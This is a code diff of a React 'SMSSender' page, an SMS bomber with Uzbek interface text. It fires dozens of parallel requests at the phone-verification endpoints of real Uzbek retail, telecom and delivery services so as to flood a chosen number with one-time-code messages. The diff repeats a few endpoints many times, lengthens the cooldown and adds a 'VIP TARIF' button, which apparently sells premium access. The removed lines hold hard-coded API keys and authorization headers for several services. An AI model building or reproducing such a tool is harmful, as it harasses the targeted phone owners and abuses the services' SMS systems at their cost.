@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from "react";
 import { Send, AlertCircle, CheckCircle2, Timer, XCircle } from "lucide-react";
+import { useNavigate } from 'react-router-dom';
 
 // Helper function to handle API requests with timeout
 const sendRequest = async (url, body, method = "POST", headers = {}) => {
@@ -14,7 +15,7 @@ const sendRequest = async (url, body, method = "POST", headers = {}) => {
         ...headers,
       },
       body: JSON.stringify(body),
-      signal: controller.signal
+      signal: controller.signal,
     });
 
     clearTimeout(timeoutId);
@@ -43,7 +44,7 @@ function SMSSender() {
     let interval;
     if (cooldown > 0) {
       interval = setInterval(() => {
-        setCooldown(prev => prev - 1);
+        setCooldown((prev) => prev - 1);
       }, 1000);
     }
     return () => clearInterval(interval);
@@ -61,89 +62,209 @@ function SMSSender() {
     setFailCount(0);
 
     const apis = [
-      // E-commerce and Retail
-      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://api.lochin.uz/en/api/v1/e_commerce/register', body: { username: `+${phone}` } },
-      { url: 'https://api.brandstore.uz/api/auth/code/create', body: { phone } },
-      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
-      { url: 'https://www.kattabozor.uz/api/v1/send_sms_code', body: { phoneNumber: phone } },
-      { url: 'https://api.uybor.uz/api/v1/auth/code', body: { phone: `+${phone}` } },
-      { url: 'https://api.zon.uz/auth/sign/send-code', body: { mobile: phone } },
-      
-      // Telecom Services
-      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },
-      { url: 'https://market.beeline.uz/api/web/auth/login', body: { phone: `+${phone}` } },
-      { url: `https://beeline.uz/api/refill/args/auth/${phone}/otp/send`, body: {}, method: 'POST', headers: { 'xAppKey': 'Gr8M2k5FQkbK' } },
-      
-      // Food Delivery
-      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone: `+${phone}` } },
-      { url: 'https://yemak.uz/api/user/auth', body: { phone_number: phone.substring(3) } },
-      { url: 'https://customer.api.delever.uz/v1/customers/login', body: { phone: `+${phone}` }, headers: { 'Shipper': '0d96ff6b-d880-46e9-bb75-43db31eb0d76' } },
-      
-      // Banking and Financial
-      { url: 'https://back.asakabank.uz/core/v1/get-in-touch-create', body: { name: "Name", phone, type: 1 } },
-      
-      // Entertainment and Media
-      { url: 'https://auth.itv.uz/v1/auth/via-number/sign-in', body: { phone_number: phone } },
-      { url: 'https://api.podium.uz/v1/verify_phone', body: { data: { phone: `+${phone}` } } },
-      
-      // Healthcare
-      { url: 'https://prod.xmed.uz/Tele-medicine-0.0.1-SNAPSHOT/v2/auth/registration', body: { mobileNumber: `+${phone}` } },
-      
-      // Marketplace and Services
-      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
-      { url: 'https://api.radius.uz/api/v2/otp', body: { phone_number: phone } },
-      { url: 'https://silkroad.ox-sys.com/market-api/sent-verification', body: { phoneNumber: `+${phone}` }, headers: { 'security-key': 'NFfZU_xXfo9D4DMAOrCDLiJ-qufE2jb1aH6YRqYlQ2g=' } },
-      { url: 'https://api.7saber.uz/client/sms/send', body: { phone: `+${phone}` }, headers: { 'Authorization': 'Basic Kzk5ODkwMTIzNDU2NzpkY2QwNTRjZjJlYjM5NjIyODQxNGZmMDZmZGQ0MTA4NQ==' } },
-      { url: 'https://api.allgood.uz/auth/send-otp', body: { phone: `+${phone}` }, headers: { 'deviceid': '6c10c22247c90dc53e3f62f8efe9eddb', 'devicetype': 'WEB' } },
-      { url: 'https://evsapi.ectn.uz/service/client-auth', body: { phone, lang: 'en' } },
-      
-      // Delivery Services
-      { url: 'https://core.bringo.uz/api/v1/customer/users/authenticate', body: { 
-        phone, 
-        device: { 
-          name: navigator.userAgent,
-          serial: crypto.randomUUID(),
-          version: "1.0.0",
-          build: "",
-          fcm_token: "",
-          platform: "web"
-        }
-      }},
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
 
-      // Additional Services (repeated for more attempts)
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+         
+      
+      
+
+
       { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
-      { url: 'https://api.express24.uz/client/v4/authentication/code', body: { phone: `+${phone}` } },
-      { url: 'https://api.100k.uz/api/auth/sms-login', body: { phone: `+${phone}`, username: "User" } },
-      { url: 'https://api.idea.uz/api/v2/otp', body: { phone_number: phone, type: "register" } },
-      { url: 'https://api.shop.ucell.uz/api/client/v1/auth/send', body: { phone: `+${phone}` } },
-      { url: 'https://market.beeline.uz/api/web/auth/login', body: { phone: `+${phone}` } }
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+
+
+      
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      { url: 'https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify', body: { phone } },
+      
+      
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://gw.alifnasiya.uz/alifnasiya/auth/phone-verify",
+        body: { phone },
+      },
+      {
+        url: "https://api.brandstore.uz/api/auth/code/create",
+        body: { phone },
+      },
+
+
+
+
+      {
+        url: "https://api.shop.ucell.uz/api/client/v1/auth/send",
+        body: { phone: `+${phone}` },
+      },
+      {
+        url: "https://market.beeline.uz/api/web/auth/login",
+        body: { phone: `+${phone}` },
+      },
+   
     ];
 
-    const results = await Promise.all(apis.map(api => sendRequest(api.url, api.body)));
-    
-    const successResults = results.filter(r => r.success);
-    const failResults = results.filter(r => !r.success);
+    const results = await Promise.all(
+      apis.map((api) => sendRequest(api.url, api.body))
+    );
+
+    const successResults = results.filter((r) => r.success);
+    const failResults = results.filter((r) => !r.success);
 
     setSuccessCount(successResults.length);
     setFailCount(failResults.length);
     setLastSentTime(new Date());
-    setCooldown(30); // 30 second cooldown
+    setCooldown(50); // 50 second cooldown
     setLoading(false);
   };
 
   const formatTime = (date) => {
-    return new Intl.DateTimeFormat('uz', {
-      hour: '2-digit',
-      minute: '2-digit',
-      second: '2-digit'
+    return new Intl.DateTimeFormat("uz", {
+      hour: "2-digit",
+      minute: "2-digit",
+      second: "2-digit",
     }).format(date);
+  };
+
+  const navigate = useNavigate(); // Sahifaga o'tish uchun hook
+
+  const goToVipPage = () => {
+    navigate('/Vip-Page'); // "/Vip" sahifasiga o'tish
   };
 
   return (
     <div className="container">
       <div className="card sms-card">
-        <h1 className="title">SMS Yuborish</h1>
+        <h1 className="title">🚀SMS Yuborish</h1>
 
         <div className="input-group">
           <label className="input-label">Telefon raqami:</label>
@@ -151,7 +272,9 @@ function SMSSender() {
             type="text"
             placeholder="998901234567"
             value={phone}
-            onChange={(e) => setPhone(e.target.value.replace(/\D/g, "").slice(0, 12))}
+            onChange={(e) =>
+              setPhone(e.target.value.replace(/\D/g, "").slice(0, 12))
+            }
             className="input"
             disabled={loading || cooldown > 0}
           />
@@ -200,6 +323,9 @@ function SMSSender() {
               SMS Yuborish
             </>
           )}
+        </button>
+        <button className="button vip-button" onClick={goToVipPage}>
+          VIP TARIF
         </button>
       </div>
     </div>
